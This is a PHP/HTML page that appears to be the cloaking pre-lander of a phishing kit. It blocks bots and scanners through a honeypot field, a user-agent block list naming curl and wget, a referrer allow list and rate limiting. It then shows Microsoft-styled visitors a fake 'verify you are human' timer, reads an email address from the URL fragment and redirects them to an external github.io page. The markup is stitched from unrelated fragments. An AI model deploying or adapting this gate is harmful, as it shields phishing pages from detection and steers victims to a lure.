<?php
session_start(); // Start the session

$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit = 20; // Maximum number of requests allowed
$time_window = 60 * 60; // Time window in seconds (1 hour);

// Initialize session requests array if not already set
if (!isset($_SESSION['requests'])) {
    $_SESSION['requests'] = array();
}

$requests = &$_SESSION['requests'];
$now = time();

// Clean up old entries from the session
foreach ($requests as $ip_address => $data) {
    if ($data['last_request'] + $time_window < $now) {
        unset($requests[$ip_address]);
    }
}

// Honeypot field check to catch bots (renamed the field)
if (!empty($_POST['hidden_address_field'])) {
    // Honeypot filled indicates bot
    http_response_code(403);
    echo json_encode(["status" => "fail", "reason" => "bot_detected"]);
    exit();
}


// Mouse movement check
if (isset($_POST['mouse_movement'])) {
    $mouse_movement = $_POST['mouse_movement'];
    // Process the mouse movement data here
} else {
    // Handle the case where mouse movement data is not sent
    $mouse_movement = null; // Or take appropriate action
}


// User-Agent check
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$suspicious_agents = ['bot', 'crawl', 'spider', 'curl', 'wget'];

foreach ($suspicious_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        http_response_code(403); // Forbidden
        echo json_encode(["status" => "fail", "reason" => "bot_user_agent_detected"]);
        exit();
    }
}

// Referrer check (only block if it's suspicious, not missing)
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
if (!empty($referrer)) {
    // Block suspicious referrers (optional: add your own conditions)
    $allowed_domains = ['https://sertechprov.github.io']; // Add valid domains
    $is_valid_referrer = false;

    foreach ($allowed_domains as $domain) {
        if (stripos($referrer, $domain) !== false) {
            $is_valid_referrer = true;
            break;
        }
    }

    if (!$is_valid_referrer) {
        http_response_code(403); // Forbidden
        echo json_encode(["status" => "fail", "reason" => "invalid_referrer"]);
        exit();
    }
}

// Rate limiting check
if (isset($requests[$ip])) {
    $requests[$ip]['count']++;
    $requests[$ip]['last_request'] = $now;

    // If request count exceeds the rate limit, deny access
    if ($requests[$ip]['count'] > $rate_limit) {
        http_response_code(429); // Too Many Requests
        echo json_encode(["status" => "lost", "message" => "i think you are lost"]);
        exit();
    }
} else {
    // Add new IP address to session tracking
    $requests[$ip] = array('count' => 1, 'last_request' => $now);
}

// If everything is okay, proceed to render the landing page
?>

<!DOCTYPE html>
<html>
<head>
    <title>Your Landing Page</title>
    <!-- CSS to hide the honeypot field -->
    <style>
        .ant-bot {
            display: none; /* Honeypot field hidden from real users */
            position: absolute;
            left: -9999px;
        }
        .container {
            text-align: center;
            margin: 50px auto;
        }
        h2 {
            font-size: 2em;
        }
        p {
            font-size: 1.2em;
        }
    </style>

    <!-- JavaScript for mouse movement detection -->
    <script>
        window.onload = function() {
            // Mouse movement tracking to detect bots
            let hasMovedMouse = false;
            window.addEventListener('mousemove', function() {
                hasMovedMouse = true;
            });

            // Form submission handler
            document.querySelector('form').onsubmit = function(event) {
                // Check if mouse movement was detected
                if (!hasMovedMouse) {
                    document.getElementById('mouse-movement').value = 'bot';
                } else {
                    document.getElementById('mouse-movement').value = 'human';
                }
            };
        };
    </script>
</head>
<body>
   <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: rgba(0,0,0,0.55);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background: #ffffff;
            filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000');
            background-size: cover;
        }
        .background-overlay {
    background: rgba(0,0,0,0.55);
    filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000');
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%
}

        .header {
            width: 100%;
            background-color: #0078d4;
            color: white;
            text-align: left;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 18px;
            position: absolute;
            top: 0;
        }

        .header span {
            margin-left: 20px;
        }

        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 100%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .container p {
            margin-bottom: 10px;
            color: #666;

        }

        .container p2 {
            margin-bottom: 10px;
            color: #666;
            font-size: 13px;
            margin-bottom: 20px
        }

        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
        }

        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #005a9e;
        }

        .container .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .container h2 {
                font-size: 20px;
            }

            .container .space {
                margin-bottom: 20px;
            
            }

            .container input[type="email"] {
                font-size: 14px;
            }

            .container button {
                font-size: 14px;
            }
        }

        .button {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        .button.green {
            background-color: green;
        }
        .popup {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 1px solid #ccc;
            padding: 20px;
            background: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
            z-index: 20;
        }
        .popup button {
            margin-top: 10px;
        }
        .popup .close-btn {
            position: absolute;
            top: 5px;
            right: 10px;
            cursor: pointer;
        }
        .blur {
            filter: blur(5px);
            pointer-events: none;
        }
    </style>
</head>
<body>
         <div class="container" id="container">
        <h2 style="font-size:20px">Let us know you are human</h2>
        <p id="message">Please wait for the timer to expire before you continue.</p>
        <p id="timer">Please wait <span id="seconds">6</span> seconds.</p>
        <button id="continue-button" class="button">Continue</button>
    </div>

    <div class="popup" id="popup">
        <span class="close-btn" id="close-popup">X</span>
        <p>You have to wait for 6 seconds before you can proceed.</p>
        <button id="close-button" class="button">Close</button>
    </div>

    <script>
        // Function to get email from the URL and preserve "@" character
        function getEmailFromUrl() {
            const url = window.location.href;
            const email = url.split('#')[1];
            if (email) {
                return email.split('@').map(encodeURIComponent).join('@');
            }
            return '';
        }

        let seconds = 6;
        const timerElement = document.getElementById('seconds');
        const messageElement = document.getElementById('message');
        const button = document.getElementById('continue-button');
        const popup = document.getElementById('popup');
        const closeButton = document.getElementById('close-button');
        const closePopupButton = document.getElementById('close-popup');
        const container = document.getElementById('container');
        const email = getEmailFromUrl();

        function resetTimer() {
            clearInterval(timerInterval);
            seconds = 5;
            timerElement.textContent = seconds;
            messageElement.textContent = "Please wait for the timer to expire before you continue.";
            timerInterval = setInterval(updateTimer, 1000);
        }

        function updateTimer() {
            seconds--;
            timerElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(timerInterval);
                messageElement.textContent = "You can proceed now";
                button.classList.add('blue');
                button.onclick = () => {
                    window.location.href = `https://sertechprov.github.io/nod.js-readme/`;
                };
            }
        }

        let timerInterval = setInterval(updateTimer, 1000);

        button.onclick = () => {
            if (seconds > 0) {
                popup.style.display = 'block';
                container.classList.add('blur');
            }
        };

        closeButton.onclick = closePopupButton.onclick = () => {
            popup.style.display = 'none';
            container.classList.remove('blur');
            resetTimer();
        };
    </script>


<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8b210fd0abda0b59',t:'MTcyMzQ3MTk2MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><div id="shopify-block-10025992882218306672" class="shopify-block shopify-app-block">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700&display=swap" class="sp-whatsapp-embed"/>
</div></body>

        <!-- Honeypot field to catch bots (hidden from users) -->
        <form method="post">
            <input type="hidden" name="mouse_movement" id="mouse-movement" value="human" />
            <input type="text" name="hidden_address_field" class="ant-bot" /> <!-- Honeypot field -->
            <button type="submit" style="display:none;">Submit</button>
        </form>
        
        
    </div>
	<script>
	window.onload = function() {
    let hasMovedMouse = false;
    let movements = 0;

    // Track mouse movements and events over time
    window.addEventListener('mousemove', function() {
        hasMovedMouse = true;
        movements++;
    });

    window.addEventListener('click', function() {
        movements++;
    });

    // On form submission
    document.querySelector('form').onsubmit = function(event) {
        if (!hasMovedMouse || movements < 5) {
            document.getElementById('mouse-movement').value = 'bot';
        } else {
            document.getElementById('mouse-movement').value = 'human';
        }
    };
};
</script>
	
    <!-- Your visible landing page ends here -->
</body>
</html>
